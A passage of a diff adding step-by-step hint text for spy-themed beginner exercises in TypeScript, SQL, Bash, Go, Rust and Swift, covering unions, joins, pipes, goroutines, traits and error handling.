+    "Create a <code>new Map&lt;T[K], T&gt;()</code>, call <code>set(x[key], x)</code> for every item, and return the map."
+  ],
+  ts8: [
+    "Declare the union: <code>type Event = { kind: \"login\"; user: string } | { kind: \"breach\"; severity: number } | { kind: \"logout\"; user: string };</code>",
+    "Write <code>function describe(e: Event): string {</code> with <code>switch (e.kind) {</code>.",
+    "Add <code>case \"login\": return `${e.user} in`;</code>. Inside each case, TypeScript knows exactly which fields exist.",
+    "Add the <code>\"breach\"</code> case returning <code>`BREACH sev ${e.severity}`</code> and the <code>\"logout\"</code> case returning <code>`${e.user} out`</code>.",
+    "Add <code>default: { const unreachable: never = e; return unreachable; }</code>. If someone adds a new kind later, this line stops compiling."
+  ],
+  ts9: [
+    "<code>Partial&lt;T&gt;</code> is T with every field optional, and <code>Omit&lt;T, K&gt;</code> is T without the field K.",
+    "Write <code>function patch&lt;T&gt;(obj: T, changes: Partial&lt;T&gt;): T { return { ...obj, ...changes }; }</code>. Fields that come later win.",
+    "Write <code>function redact&lt;T, K extends keyof T&gt;(obj: T, key: K): Omit&lt;T, K&gt; {</code>",
+    "Copy the object with <code>const copy = { ...obj };</code>, <code>delete copy[key];</code>, then return <code>copy</code>. Never change the original."
+  ],
+  ts10: [
+    "Write the signature exactly: <code>async function sweep(hosts: string[], ping: (h: string) =&gt; Promise&lt;number&gt;): Promise&lt;Record&lt;string, number&gt;&gt; {</code>",
+    "Start every ping together: <code>const ms = await Promise.all(hosts.map(h =&gt; ping(h)));</code>",
+    "Build the result object: <code>const out: Record&lt;string, number&gt; = {};</code> and set <code>out[hosts[i]] = ms[i]</code> for every index.",
+    "Return <code>out</code>. <code>Promise.all</code> keeps the same order as <code>hosts</code>."
+  ],
+  ts11: [
+    "Declare <code>type Result&lt;T&gt; = { ok: true; value: T } | { ok: false; error: string };</code>",
+    "In <code>parsePort(s: string): Result&lt;number&gt;</code>, reject anything that isn't all digits (<code>/^\\d+$/</code>) with <code>{ ok: false, error: \"invalid port\" }</code>.",
+    "Convert with <code>Number(s)</code>. If it's from 1 to 65535, return <code>{ ok: true, value: n }</code>, otherwise the same error.",
+    "Write the type guard <code>function isOk&lt;T&gt;(r: Result&lt;T&gt;): r is { ok: true; value: T } { return r.ok; }</code>"
+  ],
+  ts12: [
+    "Copy in your <code>Result&lt;T&gt;</code> type, then declare <code>Ev</code> and <code>interface Summary</code> exactly as the task shows.",
+    "In <code>parse(line)</code>, split on whitespace. Anything other than an IP followed by <code>OK</code> or <code>FAIL</code> returns <code>{ ok: false, error: ... }</code>.",
+    "For good lines, return <code>{ ok: true, value: { kind: status === \"FAIL\" ? \"fail\" : \"ok\", ip } }</code>.",
+    "In <code>async function analyze(src)</code>, run <code>await src()</code> and loop. Errors add 1 to <code>errors</code>, good lines add 1 to <code>total</code>, and fails add 1 to <code>fails</code> and to that IP's count.",
+    "Pick the IP with the highest count (or <code>null</code>) and return the full <code>Summary</code> object."
+  ],
+
+  // ---------------- SQL ----------------
+  sql1: [
+    "Every query here runs against a practice database with <code>agents</code>, <code>events</code> and <code>nodes</code> tables.",
+    "Start with <code>SELECT</code>, then list the columns you want, separated by a comma: <code>name AS handle, faction</code>.",
+    "<code>AS handle</code> renames the column in the output only. The table itself doesn't change.",
+    "Finish with <code>FROM agents;</code>. The semicolon ends the statement."
+  ],
+  sql2: [
+    "<code>SELECT name, rank FROM agents</code>",
+    "Add <code>WHERE faction IN ('sentinel', 'logos')</code>. Text values go in single quotes.",
+    "Join the second condition with <code>AND rank >= 3</code>.",
+    "Finish with <code>ORDER BY name;</code> so the rows come out alphabetically."
+  ],
+  sql3: [
+    "<code>SELECT DISTINCT ip FROM events</code>. <code>DISTINCT</code> drops repeated rows.",
+    "Keep only failures: <code>WHERE status = 'failed'</code>.",
+    "Sort: <code>ORDER BY ip</code>. Ascending order is the default.",
+    "Limit the output with <code>LIMIT 3;</code> at the very end."
+  ],
+  sql4: [
+    "<code>SELECT ip, COUNT(*) AS fails FROM events WHERE status = 'failed'</code>",
+    "Group the rows for each IP together with <code>GROUP BY ip</code>. <code>COUNT(*)</code> then counts per group.",
+    "Filter the groups with <code>HAVING COUNT(*) >= 2</code>. <code>WHERE</code> filters rows and <code>HAVING</code> filters groups.",
+    "Finish with <code>ORDER BY fails DESC, ip;</code>"
+  ],
+  sql5: [
+    "Give each table a short alias: <code>FROM events e JOIN agents a</code>.",
+    "Say how the rows match: <code>ON a.id = e.agent_id</code>.",
+    "Pick the columns with their aliases: <code>SELECT a.name, e.ip, e.ts</code>.",
+    "Add <code>WHERE e.status = 'failed' ORDER BY e.id;</code>"
+  ],
+  sql6: [
+    "A <code>LEFT JOIN</code> keeps every agent, even ones with no matching event. Their event columns come back as <code>NULL</code>.",
+    "<code>SELECT a.name FROM agents a LEFT JOIN events e ON e.agent_id = a.id</code>",
+    "Keep only the agents with no events: <code>WHERE e.id IS NULL</code>. Use <code>IS NULL</code>, never <code>= NULL</code>.",
+    "Finish with <code>ORDER BY a.name;</code>"
+  ],
+  sql7: [
+    "Start with a named subquery, called a CTE: <code>WITH fails AS (SELECT agent_id, COUNT(*) AS c FROM events WHERE status = 'failed' GROUP BY agent_id)</code>.",
+    "Join it to <code>agents</code> to get the names: <code>SELECT a.name, f.c FROM fails f JOIN agents a ON a.id = f.agent_id</code>.",
+    "Keep only the top count: <code>WHERE f.c = (SELECT MAX(c) FROM fails)</code>.",
+    "Finish with <code>ORDER BY a.name;</code>. If two agents tie, both appear."
+  ],
+  sql8: [
+    "Start with <code>CREATE TABLE safehouses (</code> and list one column per line, separated by commas.",
+    "<code>id INTEGER PRIMARY KEY</code> and <code>district TEXT NOT NULL</code>",
+    "<code>capacity INTEGER NOT NULL CHECK (capacity > 0)</code>. The database will reject zero or negative capacities.",
+    "<code>node_id INTEGER REFERENCES nodes(id)</code>, which links each safe house to a node. Close with <code>);</code>"
+  ],
+  sql9: [
+    "Start the transaction with <code>BEGIN;</code>. Nothing is final until <code>COMMIT</code>.",
+    "<code>UPDATE nodes SET online = 0 WHERE district = 'old quarter';</code>",
+    "<code>INSERT INTO nodes (district, online) VALUES ('tunnel', 1);</code>",
+    "<code>DELETE FROM nodes WHERE district = 'harbor' AND online = 0;</code>",
+    "End with <code>COMMIT;</code>"
+  ],
+  sql10: [
+    "An index is a lookup table the database keeps so searches don't scan every row.",
+    "<code>CREATE INDEX idx_events_ip_status ON events(ip, status);</code>",
+    "<code>CREATE UNIQUE INDEX idx_agents_name ON agents(name);</code>. A unique index also blocks duplicate names.",
+    "Two statements, each ending with a semicolon."
+  ],
+  sql11: [
+    "A window function ranks rows inside groups without merging them: <code>RANK() OVER (PARTITION BY faction ORDER BY rank DESC) AS r</code>.",
+    "Put it in a CTE: <code>WITH ranked AS (SELECT name, faction, RANK() OVER (...) AS r FROM agents)</code>.",
+    "You can't filter on <code>r</code> in the same query that creates it, which is why the CTE is needed.",
+    "Then <code>SELECT name, faction, r FROM ranked WHERE r = 1 ORDER BY faction;</code>"
+  ],
+  sql12: [
+    "Start with <code>CREATE VIEW threat_board AS</code>, followed by a normal <code>SELECT</code>.",
+    "Select <code>e.ip</code>, <code>COUNT(*) AS fails</code>, <code>COUNT(DISTINCT a.name) AS agents</code> and <code>MAX(e.ts) AS last_seen</code>.",
+    "<code>FROM events e JOIN agents a ON a.id = e.agent_id WHERE e.status = 'failed' GROUP BY e.ip;</code>",
+    "Then, as a second statement, run <code>SELECT * FROM threat_board ORDER BY fails DESC, ip;</code>"
+  ],
+
+  // ---------------- Bash ----------------
+  sh1: [
+    "Each line of a shell script is one command, run in order, as if you typed it into a terminal.",
+    "Make all three folders at once: <code>mkdir -p ops/intel/2026</code>. <code>-p</code> creates any missing parent folders.",
+    "Move into the new folder: <code>cd ops/intel/2026</code>.",
+    "Create an empty file: <code>touch brief.txt</code>.",
+    "List everything in long format, including hidden files: <code>ls -la</code>. <code>-l</code> is long format and <code>-a</code> shows hidden entries."
+  ],
+  sh2: [
+    "<code>grep</code> prints the lines that match a pattern. <code>-i</code> ignores case.",
+    "Start with <code>grep -i BLACKOUT relay.log</code>.",
+    "Send that output into a second grep with a pipe, <code>|</code>. <code>grep -v TEST</code> keeps the lines that do NOT contain TEST.",
+    "Pipe the result into <code>wc -l</code>, which counts lines. The whole thing is one line: <code>grep -i BLACKOUT relay.log | grep -v TEST | wc -l</code>."
+  ],
+  sh3: [
+    "Set a variable with no spaces around the <code>=</code>: <code>TARGET=\"relay.log\"</code>. A space would make Bash treat it as a command.",
+    "Capture a command's output with <code>$(...)</code>: <code>STAMP=$(date +%F)</code>.",
+    "Count FAIL lines: <code>HITS=$(grep -c FAIL \"$TARGET\")</code>. Keep the double quotes around <code>$TARGET</code>.",
+    "Print the sentence: <code>echo \"$STAMP: $HITS failures in $TARGET\"</code>."
+  ],
+  sh4: [
+    "<code>$1</code> is the first argument passed to the script. <code>[[ -z \"$1\" ]]</code> is true when it's empty.",
+    "Write <code>if [[ -z \"$1\" ]]; then</code>, then <code>echo \"usage: $0 &lt;file&gt;\"</code> and <code>exit 1</code>.",
+    "Add <code>elif [[ -f \"$1\" ]]; then</code> followed by <code>echo \"scanning $1\"</code>. <code>-f</code> means \"is a regular file\".",
+    "Add <code>else</code>, then <code>echo \"not found: $1\"</code> and <code>exit 2</code>.",
+    "Close the block with <code>fi</code> (\"if\" backwards)."
+  ],
+  sh5: [
+    "Read a file one line at a time: <code>while IFS= read -r host; do</code> ... <code>done &lt; hosts.txt</code>.",
+    "<code>IFS=</code> keeps spaces at the edges of a line, and <code>-r</code> keeps backslashes as they are.",
+    "Inside the loop, ping once and hide its output: <code>ping -c 1 \"$host\" &amp;&gt;/dev/null</code>.",
+    "Chain the result: <code>&amp;&amp; echo \"$host up\" || echo \"$host down\"</code>. <code>&amp;&amp;</code> runs when the ping worked and <code>||</code> runs when it failed."
+  ],
+  sh6: [
+    "Define the function: <code>archive() {</code> ... <code>}</code>",
+    "Inside it, <code>local src=\"$1\"</code> and <code>local dest=\"${2:-/tmp}\"</code>. <code>${2:-/tmp}</code> uses /tmp when no second argument is given.",
+    "If the source doesn't exist, stop: <code>[[ -e \"$src\" ]] || return 1</code>.",
+    "Make the archive: <code>tar -czf \"$dest/$(basename \"$src\").tar.gz\" \"$src\"</code>.",
+    "After the function, call it with all the script's arguments: <code>archive \"$@\"</code>."
+  ],
+  sh7: [
+    "Print the first column (the IP) of each line: <code>awk '{ print $1 }' access.log</code>.",
+    "Pipe it into <code>sort | uniq -c</code>. <code>uniq -c</code> counts repeated lines next to each other, which is why you sort first.",
+    "Sort by count, biggest first, with <code>sort -nr</code>, then keep the first five with <code>head -n 5</code>.",
+    "On a new line, redact tokens: <code>sed 's/token=[^ ]*/token=REDACTED/g' app.log &gt; clean.log</code>. <code>[^ ]*</code> matches everything up to the next space."
+  ],
+  sh8: [
+    "File modes are three digits: owner, group, everyone else. 7 = read+write+run, 6 = read+write, 0 = nothing.",
+    "<code>chmod 700 sweep.sh</code> lets only the owner use the script.",
+    "<code>chmod 600 ~/.ssh/id_ed25519</code> lets only the owner read the private key.",
+    "Find the process: <code>PID=$(pgrep cryptominer)</code>.",
+    "Ask it to stop: <code>kill -TERM \"$PID\"</code>."
+  ],
+  sh9: [
+    "First line, the shebang: <code>#!/usr/bin/env bash</code>.",
+    "Turn on strict mode: <code>set -euo pipefail</code>. The script stops on errors (<code>-e</code>), unset variables (<code>-u</code>) and failures inside pipes (<code>pipefail</code>).",
+    "Make a temp folder: <code>WORK=$(mktemp -d)</code>.",
+    "Clean it up however the script ends: <code>trap 'rm -rf \"$WORK\"' EXIT</code>.",
+    "Check the relay: <code>curl -fsS https://relay.example/health &gt; \"$WORK/health.json\" || { echo \"relay down\" &gt;&amp;2; exit 3; }</code>. <code>&gt;&amp;2</code> sends the message to stderr."
+  ],
+  sh10: [
+    "<code>curl -fsS</code> fetches a URL quietly and fails on HTTP errors.",
+    "Add the auth header: <code>-H \"Authorization: Bearer $TOKEN\"</code>, then the URL <code>https://relay.example/api/nodes</code>.",
+    "Pipe the JSON into <code>jq -r</code>. <code>-r</code> prints raw text without quotes.",
+    "The jq filter: <code>'.nodes[] | select(.online == false) | .name'</code>. It walks every node, keeps the offline ones and prints each name."
+  ],
+  sh11: [
+    "<code>export RELAY_ENV=prod</code> makes the variable visible to programs you start.",
+    "Put your folder first on the PATH: <code>export PATH=\"$HOME/ops/bin:$PATH\"</code>.",
+    "A cron line has five time fields: minute, hour, day of month, month, day of week. <code>*/15 * * * *</code> means every 15 minutes.",
+    "Write the line: <code>*/15 * * * * /opt/ops/sweep.sh &gt;&gt; /var/log/sweep.log 2&gt;&amp;1</code>. <code>&gt;&gt;</code> appends, and <code>2&gt;&amp;1</code> sends errors to the same place."
+  ],
+  sh12: [
+    "Start with the shebang and <code>set -euo pipefail</code>.",
+    "Check the log is readable: <code>[[ -r \"${1:-}\" ]] || { echo \"usage: triage.sh &lt;log&gt;\" &gt;&amp;2; exit 1; }</code>. Under strict mode, <code>${1:-}</code> avoids an unset-variable error.",
+    "Define <code>top_ips() { awk '{ print $1 }' \"$1\" | sort | uniq -c | sort -nr | head -n 3; }</code>.",
+    "Loop over its output: <code>top_ips \"$1\" | while read -r count ip; do</code>.",
+    "Inside the loop, <code>if [[ $count -gt 20 ]]; then echo \"block $ip ($count hits)\"; fi</code>, then <code>done</code>.",
+    "End with <code>exit 0</code>."
+  ],
+
+  // ---------------- Go ----------------
+  go1: [
+    "Every Go file starts with <code>package main</code>. Add <code>import \"fmt\"</code> below it.",
+    "Write <code>func intro(handle string, level int) string {</code>. In Go, the type comes after the name.",
+    "Return <code>fmt.Sprintf(\"Agent %s // level %d\", handle, level)</code>. <code>%s</code> is replaced with text and <code>%d</code> with a whole number.",
+    "Write <code>func main() {</code> with <code>fmt.Println(intro(\"neo\", 3))</code> inside. Go starts every program at <code>main</code>."
+  ],
+  go2: [
+    "Write <code>func threatLevel(score int) string {</code>",
+    "Open a switch with no value: <code>switch {</code>. Each <code>case</code> is then a true/false check.",
+    "<code>case score &gt;= 90: return \"CRITICAL\"</code>, then the 60 and 30 cases for HIGH and MEDIUM.",
+    "<code>default: return \"LOW\"</code>. Go cases don't fall through, so you don't need <code>break</code>."
+  ],
+  go3: [
+    "Write <code>func tally(ips []string) map[string]int {</code> and create the map with <code>counts := make(map[string]int)</code>.",
+    "Loop with <code>for _, ip := range ips { counts[ip]++ }</code>. A missing key starts at 0. The <code>_</code> ignores the index.",
+    "Return <code>counts</code>.",
+    "Write <code>func uniqueSorted(ips []string) []string {</code>. Build the tally, then collect its keys with <code>out = append(out, k)</code>.",
+    "Call <code>sort.Strings(out)</code> (add <code>\"sort\"</code> to your imports) and return <code>out</code>."
+  ],
+  go4: [
+    "Write <code>func makeCounter(start int) func() int {</code>. It returns a function.",
+    "Inside, <code>n := start</code>, then <code>return func() int { n++; return n }</code>.",
+    "Write <code>func minMax(nums ...int) (min, max int) {</code>. <code>...int</code> accepts any number of ints, and the results are named.",
+    "If <code>len(nums) == 0</code>, just <code>return</code>. Otherwise set both to <code>nums[0]</code> and loop, updating <code>min</code> and <code>max</code>.",
+    "A plain <code>return</code> sends back the named results."
+  ],
+  go5: [
+    "Write <code>func caesar(text string, shift int) string {</code> and declare <code>var b strings.Builder</code> (import <code>\"strings\"</code>).",
+    "Loop over characters: <code>for _, r := range text {</code>. Each <code>r</code> is a rune, Go's word for a character.",
+    "For <code>'a'</code> to <code>'z'</code>: <code>r = 'a' + (r-'a'+rune(shift%26)+26)%26</code>. Do the same with <code>'A'</code> for uppercase.",
+    "Write every rune with <code>b.WriteRune(r)</code>, changed or not, and return <code>b.String()</code>."
+  ],
+  go6: [
+    "Define <code>type Node struct { Name string; Strength int }</code>.",
+    "Add <code>func (n *Node) Boost(by int) int { n.Strength += by; return n.Strength }</code>. The <code>*</code> means it changes the real Node, not a copy.",
+    "Add <code>func (n Node) Label() string { return fmt.Sprintf(\"%s(%d)\", n.Name, n.Strength) }</code>. This one only reads.",
+    "Define <code>type Relay struct { Node; Hops int }</code>. Listing <code>Node</code> without a field name embeds it, so a Relay gets Node's fields and methods."
+  ],
+  go7: [
+    "Import <code>\"errors\"</code> and <code>\"fmt\"</code>, then declare <code>var ErrDenied = errors.New(\"access denied\")</code>.",
+    "Write <code>func unlock(code string) (string, error) {</code>. If <code>code == \"0451\"</code>, <code>return \"OPEN\", nil</code>.",
+    "Otherwise <code>return \"\", fmt.Errorf(\"unlock %q: %w\", code, ErrDenied)</code>. <code>%w</code> wraps the original error inside the new one.",
+    "Write <code>func safeUnlock(code string) string {</code>: call <code>unlock</code>, and <code>if errors.Is(err, ErrDenied) { return \"DENIED\" }</code>.",
+    "Otherwise return the result. In Go you check <code>err</code> every time a function can fail."
+  ],
+  go8: [
+    "Define the contract: <code>type Detector interface { Detect(line string) bool }</code>.",
+    "Define <code>type Keyword struct { Word string }</code>.",
+    "Give it the method: <code>func (k Keyword) Detect(line string) bool { return strings.Contains(line, k.Word) }</code>. Keyword now satisfies Detector, with no <code>implements</code> keyword needed.",
+    "Write <code>func countHits(d Detector, lines []string) int {</code>: loop and count the lines where <code>d.Detect(l)</code> is true."
+  ],
+  go9: [
+    "Write <code>func Filter[T any](xs []T, keep func(T) bool) []T {</code>. <code>T</code> is a type parameter.",
+    "Inside, make an empty <code>out []T</code>, append each <code>x</code> where <code>keep(x)</code> is true, and return it.",
+    "Define the constraint: <code>type Number interface { ~int | ~float64 }</code>. The <code>~</code> also allows custom types built on int or float64.",
+    "Write <code>func Sum[N Number](xs []N) N {</code>: start with <code>var total N</code>, add every x, and return the total."
+  ],
+  go10: [
+    "Write <code>func sweep(hosts []string) int {</code> and declare <code>var wg sync.WaitGroup</code>, <code>var mu sync.Mutex</code> and <code>up := 0</code>.",
+    "For each host, call <code>wg.Add(1)</code>, then start <code>go func(h string) { ... }(h)</code>. Passing <code>h</code> in gives each goroutine its own copy.",
+    "Inside the goroutine, put <code>defer wg.Done()</code> first. If <code>ping(h)</code> is true, do <code>mu.Lock(); up++; mu.Unlock()</code>.",
+    "After the loop, <code>wg.Wait()</code> blocks until every goroutine has called Done. Then <code>return up</code>.",
+    "The mutex stops two goroutines changing <code>up</code> at the same moment. Without it the count can come out wrong."
+  ],
+  go11: [
+    "Write <code>func firstReply(ctx context.Context, hosts []string) (string, error) {</code>",
+    "Make a buffered channel: <code>replies := make(chan string, len(hosts))</code>. Its buffer means late senders never get stuck.",
+    "For each host, start <code>go func(host string) { replies &lt;- ping(host) }(h)</code>.",
+    "Wait for whichever comes first: <code>select { case r := &lt;-replies: return r, nil; case &lt;-ctx.Done(): return \"\", ctx.Err() }</code>."
+  ],
+  go12: [
+    "Import <code>\"encoding/json\"</code>, <code>\"net/http\"</code> and <code>\"testing\"</code>.",
+    "Define <code>type Status struct { Node string `json:\"node\"`; Up bool `json:\"up\"` }</code>. The tags set the JSON key names.",
+    "Paste in your <code>threatLevel</code> from rank 2.",
+    "In <code>main</code>, register <code>http.HandleFunc(\"/status\", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode([]Status{...}) })</code>, then call <code>http.ListenAndServe(\":8080\", nil)</code>.",
+    "Write <code>func TestThreatLevel(t *testing.T) {</code> with a table of <code>{score, want}</code> cases. Loop over it and call <code>t.Errorf(...)</code> when a result doesn't match."
+  ],
+
+  // ---------------- Rust ----------------
+  rs1: [
+    "Write <code>fn intro(handle: &amp;str, level: u32) -&gt; String {</code>. <code>&amp;str</code> is borrowed text and <code>u32</code> is a whole number that can't be negative.",
+    "Make the last line <code>format!(\"Agent {} // level {}\", handle, level)</code> with no semicolon. The last expression of a function is what it returns.",
+    "In <code>fn main() {</code>, write <code>let mut counter = 0;</code>. Variables can't change unless you mark them <code>mut</code>.",
+    "Do <code>counter += 1;</code>, then <code>println!(\"{} #{}\", intro(\"neo\", 3), counter);</code>."
+  ],
+  rs2: [
+    "Write <code>fn threat_level(score: u32) -&gt; &amp;'static str {</code>. <code>&amp;'static str</code> means fixed text built into the program.",
+    "Open <code>match score {</code>.",
+    "Add arms with inclusive ranges: <code>90..=100 =&gt; \"CRITICAL\",</code> then <code>60..=89 =&gt; \"HIGH\",</code> then <code>30..=59 =&gt; \"MEDIUM\",</code>",
+    "Finish with <code>_ =&gt; \"LOW\",</code>. <code>_</code> matches everything else, and Rust insists every possible value is covered."
+  ],
+  rs3: [
+    "Add <code>use std::collections::HashMap;</code> at the top.",
+    "Write <code>fn tally(ips: &amp;[String]) -&gt; HashMap&lt;String, u32&gt; {</code> and <code>let mut counts = HashMap::new();</code>",
+    "Loop <code>for ip in ips {</code> and do <code>*counts.entry(ip.clone()).or_insert(0) += 1;</code>",
+    "<code>entry(...).or_insert(0)</code> finds the slot, creating it at 0 if needed, and <code>*</code> lets you change the number inside it.",
+    "End with <code>counts</code> (no semicolon) to return it."
+  ],
+  rs4: [
+    "Write <code>fn count_words(text: &amp;str) -&gt; usize { text.split_whitespace().count() }</code>. It borrows the text and only reads it.",
+    "Write <code>fn redact(msg: &amp;mut String) {</code>. <code>&amp;mut</code> is a borrow that's allowed to change the caller's String.",
+    "Inside it, <code>*msg = String::from(\"[REDACTED]\");</code>. The <code>*</code> reaches through the reference to the real value.",
+    "The caller has to pass <code>&amp;mut</code> too, like <code>redact(&amp;mut s)</code>."
+  ],
+  rs5: [
+    "Write <code>fn caesar(text: &amp;str, shift: u8) -&gt; String {</code>",
+    "Start a chain with <code>text.chars().map(|c| { ... })</code>. Each <code>c</code> is one character.",
+    "Inside the closure, for ASCII letters pick <code>base = if c.is_ascii_lowercase() { b'a' } else { b'A' }</code>.",
+    "Shift and wrap: <code>(((c as u8 - base + shift % 26) % 26) + base) as char</code>. Return other characters unchanged.",
+    "End the chain with <code>.collect()</code> to build the String."
+  ],
+  rs6: [
+    "Put <code>#[derive(Debug)]</code> above <code>struct Node { name: String, strength: u32 }</code>. It lets you print a Node with <code>{:?}</code>.",
+    "In <code>impl Node {</code>, add <code>fn new(name: &amp;str) -&gt; Self { Self { name: name.to_string(), strength: 0 } }</code>.",
+    "Add <code>fn boost(&amp;mut self, by: u32) -&gt; u32 { self.strength += by; self.strength }</code>.",
+    "Define <code>enum Event { Login(String), Breach(u8), Logout }</code>. Each variant can carry its own data.",
+    "Write <code>fn describe(e: &amp;Event) -&gt; String</code> with a <code>match</code> that has one arm per variant, for example <code>Event::Breach(sev) =&gt; format!(\"breach {sev}\")</code>."
+  ],
+  rs7: [
+    "Define <code>#[derive(Debug)] enum ParseError { Empty, BadPort(String) }</code>.",
+    "In <code>fn parse_port(s: &amp;str) -&gt; Result&lt;u16, ParseError&gt;</code>, start with <code>if s.is_empty() { return Err(ParseError::Empty); }</code>.",
+    "Then <code>s.parse::&lt;u16&gt;().map_err(|_| ParseError::BadPort(s.to_string()))</code>. <code>map_err</code> swaps the error type for yours.",
+    "In <code>fn ports(list: &amp;[&amp;str]) -&gt; Result&lt;Vec&lt;u16&gt;, ParseError&gt;</code>, loop and <code>out.push(parse_port(s)?);</code>. <code>?</code> returns early on the first error.",
+    "Finish with <code>Ok(out)</code>."
+  ],
+  rs8: [
+    "Define <code>trait Detector { fn detect(&amp;self, line: &amp;str) -&gt; bool; }</code>. A trait is a list of methods a type promises to have.",
+    "Define <code>struct Keyword(String);</code>, a struct with one unnamed field reached as <code>self.0</code>.",
+    "Implement it: <code>impl Detector for Keyword { fn detect(&amp;self, line: &amp;str) -&gt; bool { line.contains(&amp;self.0) } }</code>.",
+    "Write <code>fn count_hits&lt;D: Detector&gt;(d: &amp;D, lines: &amp;[&amp;str]) -&gt; usize { lines.iter().filter(|l| d.detect(l)).count() }</code>."
+  ],
+  rs9: [
+    "Write <code>fn fail_ips(lines: &amp;[&amp;str]) -&gt; Vec&lt;String&gt; {</code>",
+    "Start with <code>lines.iter()</code>.",
+    "Keep the FAIL lines: <code>.filter(|l| l.ends_with(\"FAIL\"))</code>.",
+    "Take the first word: <code>.map(|l| l.split_whitespace().next().unwrap_or(\"\").to_string())</code>.",
+    "Finish with <code>.collect()</code>. Iterator steps do nothing until something like <code>collect</code> asks for the results."
+  ],
+  rs10: [
+    "Import <code>use std::sync::{Arc, Mutex}; use std::thread;</code>",
+    "Create the shared counter: <code>let counter = Arc::new(Mutex::new(0));</code>. Arc shares ownership between threads, and Mutex allows one writer at a time.",
+    "For each host, <code>let c = Arc::clone(&amp;counter);</code> and push <code>thread::spawn(move || { if ping(&amp;h) { *c.lock().unwrap() += 1; } })</code> into a list of handles.",
+    "Join every handle with <code>h.join().unwrap();</code>.",
+    "Return the count with <code>let n = *counter.lock().unwrap(); n</code>."
+  ],
+  rs11: [
+    "Write <code>fn longest&lt;'a&gt;(a: &amp;'a str, b: &amp;'a str) -&gt; &amp;'a str { if b.len() &gt; a.len() { b } else { a } }</code>. <code>'a</code> says the result lives as long as both inputs.",
+    "Below it, add <code>#[cfg(test)]</code> and <code>mod tests {</code> with <code>use super::*;</code>.",
+    "Write a <code>#[test] fn picks_longer() { assert_eq!(longest(\"ab\", \"abc\"), \"abc\"); }</code>.",
+    "Add a second <code>#[test]</code>, for example one where two equal-length strings return the first."
+  ],
+  rs12: [
+    "Define <code>enum Status { Ok, Fail }</code> and <code>struct Record { ip: String, status: Status }</code>.",
+    "Write <code>fn parse(line: &amp;str) -&gt; Result&lt;Record, String&gt;</code>. Split into exactly two parts, map <code>\"OK\"</code> or <code>\"FAIL\"</code> to a Status, and return <code>Err(...)</code> for anything else.",
+    "Define <code>struct Summary { total: usize, fails: usize }</code> and <code>impl std::fmt::Display for Summary</code>, using <code>write!(f, \"{} lines, {} fails\", ...)</code>.",
+    "Write <code>fn analyze(lines: &amp;[&amp;str]) -&gt; Summary</code>: <code>lines.iter().filter_map(|l| parse(l).ok())</code> keeps only the good records. Count them and their fails.",
+    "Add a <code>#[cfg(test)] mod tests</code> with at least one <code>#[test]</code> using <code>assert_eq!</code>."
+  ],
+
+  // ---------------- Swift ----------------
+  sw1: [
+    "Write <code>func intro(handle: String, level: Int) -&gt; String {</code>. <code>-&gt; String</code> is the return type.",
+    "Return <code>\"Agent \\(handle) // level \\(level)\"</code>. <code>\\( )</code> swaps a value into the text.",
+    "Below the function, declare a constant with <code>let</code>, for example <code>let handle = \"neo\"</code>.",
+    "Declare a variable with <code>var</code> and change it, for example <code>var level = 1</code> then <code>level += 2</code>.",
+    "Print the result: <code>print(intro(handle: handle, level: level))</code>. Swift requires the labels <code>handle:</code> and <code>level:</code> when calling."
+  ],
+  sw2: [
+    "Write <code>func threatLevel(_ score: Int) -&gt; String {</code>. The <code>_</code> lets callers skip the label.",
+    "Use <code>switch score {</code> with range patterns: <code>case 90...: return \"CRITICAL\"</code>, <code>case 60..&lt;90: return \"HIGH\"</code>, <code>case 30..&lt;60: return \"MEDIUM\"</code>.",
+    "Add <code>default: return \"LOW\"</code>. Swift switches must cover every value.",
+    "Write <code>func validPin(_ pin: String) -&gt; Bool {</code> with <code>guard pin.count == 6, pin.allSatisfy(\\.isNumber) else { return false }</code>.",
+    "After the guard, <code>return true</code>. <code>guard</code> deals with the bad cases first and leaves the happy path at the bottom."
+  ],
+  sw3: [
+    "Write <code>func lookup(_ name: String, in db: [String: String]) -&gt; String {</code>",
+    "Reading from a dictionary gives an Optional, either a value or <code>nil</code>. Unwrap it safely: <code>if let found = db[name] { return found }</code>.",
+    "Then <code>guard let fallback = db[\"default\"] else { return \"unknown\" }</code>.",
+    "Return <code>fallback</code>. One line also works: <code>return db[name] ?? db[\"default\"] ?? \"unknown\"</code>.",
+    "Never write <code>!</code> after an Optional here. It crashes when the value is missing."
+  ],
+  sw4: [
+    "Write <code>func tally(_ ips: [String]) -&gt; [String: Int] {</code> and <code>var counts: [String: Int] = [:]</code>.",
+    "Loop <code>for ip in ips { counts[ip, default: 0] += 1 }</code>. <code>default: 0</code> covers keys that aren't there yet.",
+    "Return <code>counts</code>.",
+    "Write <code>func loud(_ ports: [Int]) -&gt; [Int] { ports.filter { $0 &gt; 1024 }.map { $0 * 10 } }</code>. This keeps ports above 1024 and multiplies each by 10. <code>$0</code> is the current element."
+  ],
+  sw5: [
+    "Write <code>func scan(host: String, port: Int = 443) -&gt; String { \"\\(host):\\(port)\" }</code>. Callers can leave <code>port</code> out.",
+    "Write <code>func retry(times: Int, _ op: () -&gt; Bool) -&gt; Bool</code>. Loop up to <code>times</code>, return true as soon as <code>op()</code> succeeds, and return false at the end.",
+    "Call it with a trailing closure, which is the braces placed after the parentheses: <code>let ok = retry(times: 3) { Bool.random() }</code>.",
+    "Declare <code>var handlers: [() -&gt; Void] = []</code> and <code>func onAlert(_ h: @escaping () -&gt; Void) { handlers.append(h) }</code>. <code>@escaping</code> is required because the closure is stored for later."
+  ],
+  sw6: [
+    "Write <code>struct Node {</code> with <code>var name: String</code> and <code>var strength = 0</code>.",
+    "Add a computed property: <code>var isHot: Bool { strength &gt; 80 }</code>. It's worked out each time you read it.",
+    "Add <code>mutating func boost(_ by: Int) { strength += by }</code>. Structs need <code>mutating</code> to change themselves.",
+    "Write <code>final class Session { let id: String; init(id: String) { self.id = id } }</code>. Classes are shared by reference, while structs are copied."
+  ],
+  sw7: [
+    "Define <code>enum ScanError: Error { case empty; case badPort(String) }</code>.",
+    "Write <code>func parsePort(_ s: String) throws -&gt; Int {</code>. <code>throws</code> warns callers that it can fail.",
+    "<code>guard !s.isEmpty else { throw ScanError.empty }</code>",
+    "<code>guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.badPort(s) }</code>, then <code>return p</code>.",
+    "Call it inside <code>do { let p = try parsePort(\"443\"); print(p) } catch { print(\"failed: \\(error)\") }</code>."
+  ],
+  sw8: [
